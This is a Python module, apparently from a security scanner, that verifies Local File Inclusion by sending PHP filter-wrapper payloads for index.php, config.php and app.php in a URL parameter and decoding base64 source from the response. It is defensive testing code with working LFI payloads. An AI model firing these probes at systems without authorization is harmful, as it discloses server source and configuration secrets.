"""Deterministic Local File Inclusion (LFI) Verification Strategy (C032)."""

from __future__ import annotations

import base64
import re
from typing import Any, Dict, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from backend.services.request_engine import RequestEngine, RequestSpec, RequestTimeout
from backend.services.verification_engine import (
    BaseVerificationStrategy,
    VerificationBudget,
    VerificationConclusion,
    VerificationContext,
    VerificationContract,
    VerificationReasonCode,
    VerificationStatus,
    VerificationRegistry,
)


class LocalFileInclusionStrategy(BaseVerificationStrategy):
    """
    Verifies Local File Inclusion (C032) by testing PHP stream wrappers
    (php://filter/convert.base64-encode/resource=...) and decoding base64-encoded
    source code to confirm genuine disclosure of server-side application scripts.
    """

    contract = VerificationContract(
        check_id="C032_Local_File_Inclusion",
        name="Local File Inclusion Verification",
        security_property="File inclusion mechanisms must only load static internal view templates from an authorized allowlist.",
        required_evidence_fields=["affected_url"],
        destructive=False,
    )

    LFI_VERIFICATION_PROBES = [
        ("php://filter/convert.base64-encode/resource=index.php", "index.php"),
        ("php://filter/convert.base64-encode/resource=config.php", "config.php"),
        ("php://filter/convert.base64-encode/resource=app.php", "app.php"),
    ]

    async def verify(self, context: VerificationContext) -> VerificationConclusion:
        candidate = context.candidate_evidence
        affected_url = candidate.get("affected_url") or context.target_url
        param_name = candidate.get("affected_param")

        parsed = urlparse(affected_url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not param_name and params:
            param_name = list(params.keys())[0]
        if not param_name:
            param_name = "page"

        last_resp = None
        for payload, resource_name in self.LFI_VERIFICATION_PROBES:
            test_params = dict(params)
            test_params[param_name] = [payload]
            new_query = urlencode(test_params, doseq=True)
            probe_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

            probe_spec = RequestSpec(
                url=probe_url,
                method="GET",
                timeout=RequestTimeout(connect=5.0, read=10.0, total=15.0),
            )
            try:
                resp = await context.send_verification_request(probe_spec)
                last_resp = resp
            except Exception:
                continue

            if not resp.success:
                continue

            body = resp.response_body or ""
            # Search for base64 strings in the response body that decode to PHP / source code
            b64_matches = re.findall(r"[A-Za-z0-9+/=]{20,}", body)
            for candidate_b64 in b64_matches:
                try:
                    decoded = base64.b64decode(candidate_b64).decode("utf-8", errors="ignore")
                    if any(marker in decoded for marker in ["<?php", "require", "function", "include", "namespace"]):
                        snippet = decoded[:150].replace("\n", " ")
                        ev_id = context.record_evidence(
                            evidence_type="lfi_decoded_source",
                            data={
                                "resource_name": resource_name,
                                "decoded_snippet": snippet,
                                "payload": payload,
                            },
                            request_id=resp.request_id,
                        )
                        return VerificationConclusion(
                            status=VerificationStatus.VERIFIED,
                            reason_code=VerificationReasonCode.PROPERTY_DEMONSTRATED,
                            reason_description=f"Local File Inclusion confirmed: Wrapper payload '{payload}' disclosed base64-encoded source code for '{resource_name}': '{snippet}'.",
                            evidence_ids=[ev_id],
                            request_ids=[resp.request_id],
                            confidence=95,
                        )
                except Exception:
                    continue

        ev_id = context.record_evidence(
            evidence_type="lfi_negative_control",
            data={"status": "wrapper_not_evaluated"},
            request_id=last_resp.request_id if last_resp else None,
        )
        return VerificationConclusion(
            status=VerificationStatus.FALSE_POSITIVE,
            reason_code=VerificationReasonCode.CONTROL_ENFORCED,
            reason_description="LFI stream wrappers failed to return base64-encoded source code or internal view files.",
            evidence_ids=[ev_id],
            confidence=90,
        )


VerificationRegistry.register(LocalFileInclusionStrategy)
